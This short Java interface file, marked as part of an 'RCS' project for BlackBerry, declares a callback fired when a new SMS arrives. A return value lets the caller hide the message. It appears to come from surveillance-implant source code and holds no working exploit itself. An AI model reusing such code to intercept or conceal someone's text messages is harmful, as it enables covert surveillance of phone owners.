//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.interfaces;

public interface SmsObserver extends Observer {

    /**
     * Viene invocato quando arriva un nuovo sms
     * 
     * @param dataMsg
     * @param address
     * @param incoming
     * @return true if you want to hide the sms
     */
    boolean onNewSms(String message, String address, boolean incoming);

}
